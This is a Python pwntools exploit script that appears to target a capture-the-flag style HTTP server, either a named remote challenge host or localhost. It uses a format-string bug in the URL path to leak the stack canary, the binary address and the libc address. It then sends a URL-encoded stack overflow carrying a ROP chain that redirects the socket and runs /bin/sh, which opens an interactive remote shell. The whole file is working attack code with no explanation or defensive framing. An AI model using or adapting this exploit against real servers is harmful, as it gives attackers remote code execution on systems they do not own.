import requests
from pwn import *
import time
import json

elf = context.binary = ELF("../src/server")
libc = ELF("../src/libc.so.6")

def to_hex(i:int):
    res = hex(i)[2:]
    return res if len(res) == 2 else f"0{res}"

def urlencode(s:bytes):
    res = ""
    for b in s:
        res += f"%{to_hex(b)}"
    return res.encode()

if args.REMOTE:
    HOST = "peachttp.esaip-cyber.com"
    PORT = 8080
else:
    HOST = "localhost"
    PORT = 8080

url = f"http://{HOST}:{PORT}/"


nb_elt_stack = 26

if args.DUMP:
    lstack = log.progress(f"Leaking {nb_elt_stack} elements stack")
    stack = []

    for i in range(1, nb_elt_stack):
        r = requests.get(url + f"%25{i}$p")

        address = r.text.split("/")[1]
        log.success(address)
        stack.append(address)
        time.sleep(0.1)

    lstack.success("Stack dumped")
    print(json.dumps(stack, indent=4))

    canary = int(stack[21], 16)
    rbp = int(stack[22], 16)
    rip = int(stack[23], 16)
    stdout_address = int(stack[24], 16)
else:
    stack = []


    for i in range(22, 26):
        r = requests.get(url + f"%25{i}$p")

        address = r.text.split("/")[1]
        log.success(address)
        stack.append(address)
        time.sleep(0.1)

    canary = int(stack[0], 16)
    rbp = int(stack[1], 16)
    rip = int(stack[2], 16)
    stdout_address = int(stack[3], 16)

base_address = elf.address = rip & 0xfffffffffffff000
libc_base_address = libc.address = stdout_address - libc.symbols["stdout"]

success(f"Canary leaked {hex(canary)}")
success(f"Base address leaked {hex(base_address)}")
success(f"Libc base address leaked {hex(libc_base_address)}")

rop = ROP(libc)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.execve(next(libc.search(b'/bin/sh')), 0x0, 0x0)

chain = rop.chain()


payload = 62 * b"."
payload += urlencode(p64(canary))
payload += b"B"*8
payload += urlencode(chain)


io = remote(HOST, PORT)
req = b"GET /" + payload + f" HTTP/1.0\r\nHost: {HOST}\r\n\r\n".encode()

io.sendline(req)
io.interactive()